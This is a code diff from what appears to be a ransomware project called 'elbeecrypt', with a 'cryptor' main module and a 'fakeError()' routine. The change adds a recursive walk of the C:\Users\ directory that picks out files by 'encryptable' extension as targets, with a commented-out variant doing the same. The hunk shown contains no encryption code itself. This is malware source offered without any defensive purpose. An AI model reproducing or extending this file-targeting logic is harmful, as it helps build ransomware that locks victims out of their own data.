@@ -4,6 +4,7 @@
 #include <vector>
 #include "elbeecrypt/cryptor/main.hpp"
 
+#include "elbeecrypt/common/io/direntwalk.hpp"
 #include "elbeecrypt/common/targets/extensions.hpp"
 
 //Platform-specific includes
@@ -38,9 +39,29 @@ int main(int argc, char **argv){
 
 	cout << "Encryption routines started!" << endl;
 
-	for(string ext : common::targets::Extensions::encryptable){
-		cout << "I will encrypt '." << ext << "'" << endl;
+	//Define the lambda to collect the directory listings
+	auto consumer = [](const fs::path& path){
+		if(elbeecrypt::common::targets::Extensions::isEncryptable(path)){
+			std::cout << "Found encryptable file at " << path << std::endl;
+		}
+	};
+
+	//Call the walk function with the root path and the lambda
+	elbeecrypt::common::io::DirentWalk::walk(fs::path("C:\\Users\\"), consumer);
+
+	/*
+	vector<fs::path> paths = {};
+
+	elbeecrypt::common::io::DirentWalk::directoryList("C:\\Users\\", paths);
+
+	cout << paths[0] << endl;
+
+	for(fs::path path : paths){
+		if(elbeecrypt::common::targets::Extensions::isEncryptable(path)){
+			std::cout << "Found encryptable file at " << path << std::endl;
+		}
 	}
+	*/
 }
 
 /** Impl of fakeError(). */
